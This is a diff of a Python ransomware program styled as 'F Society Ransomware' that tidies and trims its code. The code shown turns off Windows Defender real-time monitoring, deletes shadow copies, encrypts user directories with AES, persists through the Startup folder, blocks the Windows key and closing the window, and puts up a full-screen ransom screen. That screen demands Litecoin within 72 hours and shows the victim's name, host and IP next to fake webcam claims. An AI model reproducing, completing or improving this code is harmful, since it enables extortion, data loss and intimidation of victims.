@@ -7,7 +7,7 @@ import time
 import shutil
 import re
 import tkinter as tk
-from tkinter import messagebox, scrolledtext
+from tkinter import messagebox, scrolledtext, ttk
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
@@ -121,7 +121,7 @@ def get_target_directories():
     ]
     return [p for p in paths if os.path.exists(p)]
 
-# --- System Manipulation (Background) ---
+# --- System Manipulation ---
 def disable_security():
     try:
         subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -219,13 +219,11 @@ Run this program and enter the decryption key: {DECRYPT_KEY}
     with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
         f.write(note)
     
-    # Also save to a hidden file for backup decryption
     hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
     with open(hidden_path, 'w') as f:
         f.write(f"{key_hex}\n{iv_hex}\n{DECRYPT_KEY}")
 
 def run_encryption():
-    """Run encryption in background thread"""
     global encryption_key, encryption_iv
     try:
         key = generate_key()
@@ -239,31 +237,24 @@ def run_encryption():
         delete_shadow_copies()
         change_wallpaper()
         
-        total = 0
         for directory in get_target_directories():
             try:
-                count = encrypt_directory(directory, key, iv)
-                total += count
+                encrypt_directory(directory, key, iv)
             except:
                 pass
         
         create_ransom_note(key_hex, iv_hex)
         
-        # Add to startup
         try:
             startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
             shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
         except:
             pass
-        
     except:
         pass
 
-# --- Lock Windows Key ---
 def lock_windows_key():
-    """Disable the Windows key using registry"""
     try:
-        # Disable Windows key via registry
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
         try:
@@ -272,25 +263,20 @@ def lock_windows_key():
             handle = winreg.CreateKey(key, subkey)
         winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(handle)
-        
-        # Also disable via keyboard layout (method 2)
-        subprocess.run('powershell -Command "Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name \'NoWinKeys\' -Value 1"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
 
 def unlock_windows_key():
-    """Re-enable the Windows key"""
     try:
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
         handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 0)
         winreg.CloseKey(handle)
-        subprocess.run('powershell -Command "Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name \'NoWinKeys\' -Value 0"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
 
-# --- Full-Screen Decryption UI with fsociety Mask ---
+# --- Full-Screen UI ---
 class RansomwareUI:
     def __init__(self, root):
         self.root = root
@@ -299,55 +285,35 @@ class RansomwareUI:
         self.root.attributes('-topmost', True)
         self.root.configure(bg='black')
         
-        # Lock Windows key
         lock_windows_key()
         
-        # Prevent closing
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
         self.root.bind("<F11>", lambda e: "break")
         self.root.bind("<Escape>", lambda e: "break")
         self.root.bind("<Alt-F4>", lambda e: "break")
         
-        # Timer variables
         self.time_left = 72 * 3600
         self.timer_id = None
         self.hacker_index = 0
         
-        # Create UI elements
         self.create_widgets()
-        
-        # Start timer
         self.start_timer()
-        
-        # Run encryption in background after UI shows
         self.root.after(100, self.start_encryption)
     
-    def __del__(self):
-        # Unlock Windows key when window closes
-        try:
-            unlock_windows_key()
-        except:
-            pass
-    
     def create_widgets(self):
-        # Main container
         main_frame = tk.Frame(self.root, bg='black')
         main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
         
-        # Top section: Title + Timer
         top_frame = tk.Frame(main_frame, bg='black')
         top_frame.pack(fill=tk.X, pady=10)
         
-        title = tk.Label(top_frame, text="F SOCIETY RANSOMWARE", 
-                         font=('Arial', 48, 'bold'), fg='red', bg='black')
-        title.pack()
+        tk.Label(top_frame, text="F SOCIETY RANSOMWARE", 
+                 font=('Arial', 48, 'bold'), fg='red', bg='black').pack()
         
-        # Timer
         self.timer_label = tk.Label(top_frame, text="⏰ TIME REMAINING: 72:00:00", 
                                     font=('Arial', 24), fg='yellow', bg='black')
         self.timer_label.pack(pady=5)
         
-        # Webcam indicator
         webcam_frame = tk.Frame(main_frame, bg='black')
         webcam_frame.pack(pady=5)
         
@@ -356,42 +322,28 @@ class RansomwareUI:
         tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 14), fg='red', bg='black').pack(side=tk.LEFT)
         self.blink_led()
         
-        # fsociety Mask (ASCII Art)
         mask_art = r"""
         .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
-        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
-        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
         ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
         ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'
         ::::         ::::         ::::         ::::         ::::         ::::
         ::::         ::::         ::::         ::::         ::::         ::::
         ::::         ::::         ::::         ::::         ::::         ::::
-        ::::         ::::         ::::         ::::         ::::         ::::
-        ::::         ::::         ::::         ::::         ::::         ::::
         ::::..       ::::..       ::::..       ::::..       ::::..       ::::..
         ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
-         ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
         """
-        mask_label = tk.Label(main_frame, text=mask_art, font=('Courier', 8), 
-                              fg='red', bg='black', justify='center')
-        mask_label.pack(pady=10)
+        tk.Label(main_frame, text=mask_art, font=('Courier', 8), 
+                 fg='red', bg='black', justify='center').pack(pady=10)
         
-        # Info text - show the decryption key prominently
         info = f"""
-        Your files are encrypted with AES-256-CBC.
-        
         DECRYPTION KEY: {DECRYPT_KEY}
-        
-        Litecoin Address: {LTC_ADDRESS}
+        Litecoin: {LTC_ADDRESS}
         Amount: {RANSOM_AMOUNT}
-        
-        You have 72 hours to pay. After that, the key will be destroyed.
+        You have 72 hours to pay.
         """
-        info_label = tk.Label(main_frame, text=info, font=('Arial', 14), 
-                              fg='white', bg='black', justify='left')
-        info_label.pack(pady=10)
+        tk.Label(main_frame, text=info, font=('Arial', 14), 
+                 fg='white', bg='black', justify='left').pack(pady=10)
         
-        # Scary progress bar
         progress_frame = tk.Frame(main_frame, bg='black')
         progress_frame.pack(pady=10, fill=tk.X)
         
@@ -399,22 +351,25 @@ class RansomwareUI:
                                        font=('Arial', 12), fg='red', bg='black')
         self.progress_label.pack()
         
-        from tkinter import ttk
-        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', 
-                                           maximum=100)
+        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', maximum=100)
         self.progress_bar.pack(pady=5)
         self.fake_progress()
         
-        # Hacker text
         self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 11), 
                                     fg='#00ff00', bg='black')
         self.hacker_text.pack(pady=5)
         self.scroll_hacker_text()
         
-        # Victim info
-        self.show_victim_info(main_frame)
+        try:
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            username = os.environ.get('USERNAME', 'Unknown')
+            info = f"NAME: {username} | HOST: {hostname} | IP: {ip} | CAMERA: ACTIVE"
+            tk.Label(main_frame, text=info, font=('Courier', 9), 
+                     fg='#ff4444', bg='black').pack(pady=5)
+        except:
+            pass
         
-        # File list
         file_frame = tk.Frame(main_frame, bg='black')
         file_frame.pack(pady=10, fill=tk.BOTH, expand=True)
         
@@ -424,248 +379,166 @@ class RansomwareUI:
         self.file_listbox = tk.Listbox(file_frame, height=4, bg='black', fg='red', 
                                        font=('Consolas', 9), selectbackground='dark red')
         self.file_listbox.pack(padx=20, fill=tk.BOTH, expand=True)
-        self.populate_file_list()
+        for f in ['passwords.xlsx', 'bank_transfer.pdf', 'family_photos.zip', 'wallet.dat']:
+            self.file_listbox.insert(tk.END, f"🔒 {f}")
         
-        # Decryption area
         decrypt_frame = tk.Frame(main_frame, bg='black')
         decrypt_frame.pack(pady=10, fill=tk.X)
         
-        tk.Label(decrypt_frame, text="Enter Decryption Key:", 
-                 font=('Arial', 16), fg='white', bg='black').pack(side=tk.LEFT, padx=10)
+        tk.Label(decrypt_frame, text="Enter Key:", font=('Arial', 16), 
+                 fg='white', bg='black').pack(side=tk.LEFT, padx=10)
         
-        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=30, 
+        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=25, 
                                   show='*', bg='white', fg='black')
         self.key_entry.pack(side=tk.LEFT, padx=10)
         self.key_entry.focus()
         self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
         
-        decrypt_btn = tk.Button(decrypt_frame, text="DECRYPT FILES", 
-                                font=('Arial', 14, 'bold'), bg='red', fg='white',
-                                command=self.decrypt_action, padx=20, pady=5)
-        decrypt_btn.pack(side=tk.LEFT, padx=20)
+        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 14, 'bold'), 
+                  bg='red', fg='white', command=self.decrypt_action, padx=20, pady=5).pack(side=tk.LEFT, padx=20)
         
-        # Status
-        self.status_text = scrolledtext.ScrolledText(main_frame, height=6, 
+        self.status_text = scrolledtext.ScrolledText(main_frame, height=4, 
                                                      font=('Arial', 10), bg='black', fg='#00ff00')
         self.status_text.pack(pady=10, fill=tk.BOTH, expand=True)
-        self.status_text.insert(tk.END, "[+] System ready. Waiting for decryption key...\n")
-        self.status_text.see(tk.END)
+        self.status_text.insert(tk.END, "[+] Ready. Enter decryption key.\n")
         self.status_text.config(state='disabled')
     
     def blink_led(self):
-        """Blink the webcam LED"""
-        current_color = self.webcam_led.cget('fg')
-        self.webcam_led.config(fg='dark red' if current_color == 'red' else 'red')
-        self.root.after(500, self.blink_led)
-    
-    def show_victim_info(self, parent):
-        """Display scary victim info"""
         try:
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            username = os.environ.get('USERNAME', 'Unknown')
-            
-            info = f"""
-            ╔═══════════════════════════════════════════════════════════╗
-            ║  VICTIM IDENTIFICATION                                   ║
-            ╠═══════════════════════════════════════════════════════════╣
-            ║  NAME: {username.ljust(40)}║
-            ║  HOST: {hostname.ljust(40)}║
-            ║  IP:   {ip.ljust(40)}║
-            ║  LOCATION: TRACKING...                                   ║
-            ║  CAMERA: ACTIVE                                          ║
-            ║  MICROPHONE: ACTIVE                                      ║
-            ╚═══════════════════════════════════════════════════════════╝
-            """
-            
-            info_label = tk.Label(parent, text=info, font=('Courier', 9), 
-                                  fg='#ff4444', bg='black', justify='left')
-            info_label.pack(pady=5)
+            current = self.webcam_led.cget('fg')
+            self.webcam_led.config(fg='dark red' if current == 'red' else 'red')
+            self.root.after(500, self.blink_led)
         except:
             pass
     
-    def populate_file_list(self):
-        """Add fake encrypted files to list"""
-        common_files = [
-            'C:\\Users\\Admin\\Documents\\passwords.xlsx',
-            'C:\\Users\\Admin\\Desktop\\bank_transfer.pdf',
-            'C:\\Users\\Admin\\Pictures\\family_photos.zip',
-            'C:\\Users\\Admin\\AppData\\Local\\wallet.dat',
-            'C:\\Users\\Admin\\Desktop\\important_work.docx',
-            'C:\\Users\\Admin\\Downloads\\tax_return.pdf'
-        ]
-        for file in common_files:
-            self.file_listbox.insert(tk.END, f"🔒 {file}")
-    
     def fake_progress(self):
-        """Fake progress bar that goes up and down"""
-        current = self.progress_bar['value']
-        if current >= 100:
-            current = 0
-        current += random.randint(5, 15)
-        if current > 100:
-            current = 100
-        self.progress_bar['value'] = current
-        if current == 100:
-            self.progress_label.config(text="[✓] BACKUP DELETION COMPLETE", fg="light green")
-        else:
-            self.progress_label.config(text=f"[!] DELETING BACKUP FILES... {int(current)}%")
-        self.root.after(random.randint(1000, 3000), self.fake_progress)
+        try:
+            val = self.progress_bar['value'] + random.randint(5, 15)
+            if val > 100:
+                val = 100
+            self.progress_bar['value'] = val
+            self.progress_label.config(text=f"[!] DELETING BACKUP FILES... {int(val)}%")
+            if val < 100:
+                self.root.after(random.randint(1000, 3000), self.fake_progress)
+            else:
+                self.progress_label.config(text="[✓] BACKUP DELETION COMPLETE", fg="light green")
+        except:
+            pass
     
     def scroll_hacker_text(self):
-        """Scroll through hacker messages"""
-        messages = [
-            "ACCESSING SYSTEM FILES...",
-            "ENCRYPTING DATA...",
-            "DELETING SHADOW COPIES...",
-            "DISABLING SECURITY...",
-            "EXFILTRATING DATA...",
-            "MONITORING KEYSTROKES...",
-            "CAPTURING SCREENSHOTS...",
-            "DETECTING LAW ENFORCEMENT IP...",
-            "ACTIVATING WEBCAM...",
-            "UPLOADING TO C2 SERVER..."
-        ]
-        if self.hacker_index >= len(messages):
-            self.hacker_index = 0
-        self.hacker_text.config(text=f"> {messages[self.hacker_index]}")
-        self.hacker_index += 1
-        self.root.after(2000, self.scroll_hacker_text)
+        try:
+            msgs = ["ACCESSING SYSTEM...", "ENCRYPTING DATA...", "DELETING SHADOW COPIES...", 
+                    "DISABLING SECURITY...", "EXFILTRATING DATA...", "MONITORING KEYSTROKES..."]
+            self.hacker_text.config(text=f"> {msgs[self.hacker_index % len(msgs)]}")
+            self.hacker_index += 1
+            self.root.after(2000, self.scroll_hacker_text)
+        except:
+            pass
     
     def start_timer(self):
-        """Start the countdown timer"""
         self.update_timer()
     
     def update_timer(self):
-        """Update the timer display"""
-        if self.time_left <= 0:
-            self.timer_label.config(text="⏰ TIME EXPIRED - KEYS DELETED", fg="red")
-            return
-        
-        hours = self.time_left // 3600
-        minutes = (self.time_left % 3600) // 60
-        seconds = self.time_left % 60
-        self.timer_label.config(text=f"⏰ TIME REMAINING: {hours:02d}:{minutes:02d}:{seconds:02d}")
-        self.time_left -= 1
-        self.timer_id = self.root.after(1000, self.update_timer)
+        try:
+            if self.time_left <= 0:
+                self.timer_label.config(text="⏰ TIME EXPIRED", fg="red")
+                return
+            h = self.time_left // 3600
+            m = (self.time_left % 3600) // 60
+            s = self.time_left % 60
+            self.timer_label.config(text=f"⏰ TIME REMAINING: {h:02d}:{m:02d}:{s:02d}")
+            self.time_left -= 1
+            self.timer_id = self.root.after(1000, self.update_timer)
+        except:
+            pass
     
     def start_encryption(self):
         self.update_status("[+] Encrypting files in background...")
         threading.Thread(target=run_encryption, daemon=True).start()
-        self.root.after(5000, lambda: self.update_status("[+] Encryption running in background."))
     
-    def update_status(self, message):
-        self.status_text.config(state='normal')
-        self.status_text.insert(tk.END, message + "\n")
-        self.status_text.see(tk.END)
-        self.status_text.config(state='disabled')
-        self.root.update()
+    def update_status(self, msg):
+        try:
+            self.status_text.config(state='normal')
+            self.status_text.insert(tk.END, msg + "\n")
+            self.status_text.see(tk.END)
+            self.status_text.config(state='disabled')
+        except:
+            pass
     
     def decrypt_action(self):
         global encryption_key, encryption_iv
         key_input = self.key_entry.get().strip()
         
         if not key_input:
-            messagebox.showerror("Error", "Please enter the decryption key.")
+            messagebox.showerror("Error", "Enter the decryption key.")
             return
         
         if key_input != DECRYPT_KEY:
-            messagebox.showerror("Invalid Key", "The decryption key is incorrect.")
-            self.update_status("[-] Invalid decryption key entered.")
+            messagebox.showerror("Invalid Key", "Wrong decryption key.")
+            self.update_status("[-] Invalid key.")
             return
         
-        self.update_status("[+] Decryption key accepted. Starting decryption...")
-        self.root.update()
+        self.update_status("[+] Key accepted. Decrypting...")
         
         try:
-            # First try to use the stored key from memory
             if encryption_key is not None and encryption_iv is not None:
-                self.update_status("[+] Using stored key from memory...")
                 count = decrypt_all_files(encryption_key, encryption_iv)
                 if count > 0:
-                    self.update_status(f"[+] Decryption complete! {count} files restored.")
+                    self.update_status(f"[+] Decrypted {count} files!")
                     self.finish_decryption()
                     return
             
-            # Try to read from hidden backup file
-            hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
-            if os.path.exists(hidden_path):
-                self.update_status("[+] Reading key from backup file...")
-                with open(hidden_path, 'r') as f:
+            hidden = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
+            if os.path.exists(hidden):
+                with open(hidden, 'r') as f:
                     lines = f.readlines()
-                    if len(lines) >= 3:
-                        key_hex = lines[0].strip()
-                        iv_hex = lines[1].strip()
-                        stored_key = lines[2].strip()
-                        if stored_key == DECRYPT_KEY:
-                            key = base64.b64decode(key_hex)
-                            iv = base64.b64decode(iv_hex)
-                            count = decrypt_all_files(key, iv)
-                            self.update_status(f"[+] Decryption complete! {count} files restored.")
-                            self.finish_decryption()
-                            return
-            
-            # Try to read from ransom note
-            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
-            note_path = desktop + '\\README_FSOCIETY.txt'
-            
-            if os.path.exists(note_path):
-                self.update_status("[+] Reading key from ransom note...")
-                with open(note_path, 'r') as f:
-                    content = f.read()
-                    key_match = re.search(r'Key: (\S+)', content)
-                    iv_match = re.search(r'IV: (\S+)', content)
-                    
-                    if key_match and iv_match:
-                        key = base64.b64decode(key_match.group(1))
-                        iv = base64.b64decode(iv_match.group(1))
+                    if len(lines) >= 3 and lines[2].strip() == DECRYPT_KEY:
+                        key = base64.b64decode(lines[0].strip())
+                        iv = base64.b64decode(lines[1].strip())
                         count = decrypt_all_files(key, iv)
-                        self.update_status(f"[+] Decryption complete! {count} files restored.")
+                        self.update_status(f"[+] Decrypted {count} files!")
                         self.finish_decryption()
                         return
             
-            self.update_status("[-] Could not find encryption key. Decryption failed.")
-            messagebox.showerror("Error", "Could not find encryption key. The key file may have been deleted.")
+            note = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop\\README_FSOCIETY.txt'
+            if os.path.exists(note):
+                with open(note, 'r') as f:
+                    content = f.read()
+                    km = re.search(r'Key: (\S+)', content)
+                    im = re.search(r'IV: (\S+)', content)
+                    if km and im:
+                        key = base64.b64decode(km.group(1))
+                        iv = base64.b64decode(im.group(1))
+                        count = decrypt_all_files(key, iv)
+                        self.update_status(f"[+] Decrypted {count} files!")
+                        self.finish_decryption()
+                        return
             
+            self.update_status("[-] Could not find encryption key.")
+            messagebox.showerror("Error", "Key not found.")
         except Exception as e:
-            self.update_status(f"[-] Decryption error: {str(e)}")
-            messagebox.showerror("Error", f"Decryption failed: {str(e)}")
+            self.update_status(f"[-] Error: {str(e)}")
+            messagebox.showerror("Error", str(e))
     
     def finish_decryption(self):
-        """Clean up after successful decryption"""
-        # Remove ransom note
         try:
             desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
-            os.remove(desktop + '\\README_FSOCIETY.txt')
+            for f in ['README_FSOCIETY.txt']:
+                try: os.remove(desktop + '\\' + f)
+                except: pass
+            try: os.remove(os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key')
+            except: pass
+            try: ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
+            except: pass
+            if self.timer_id:
+                self.root.after_cancel(self.timer_id)
+            self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
+            unlock_windows_key()
+            messagebox.showinfo("Success", "All files decrypted!")
+            self.update_status("[+] Done. You can close this window.")
         except:
             pass
-        
-        # Remove backup key
-        try:
-            hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
-            os.remove(hidden_path)
-        except:
-            pass
-        
-        # Change wallpaper back
-        try:
-            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
-            self.update_status("[+] Wallpaper restored.")
-        except:
-            pass
-        
-        # Stop timer
-        if self.timer_id:
-            self.root.after_cancel(self.timer_id)
-        self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
-        
-        # Unlock Windows key
-        unlock_windows_key()
-        
-        messagebox.showinfo("Success", "Decryption complete! Your files have been restored.")
-        self.update_status("[+] You can now close this window.")
 
-# --- Main Entry Point ---
 def main():
     root = tk.Tk()
     app = RansomwareUI(root)
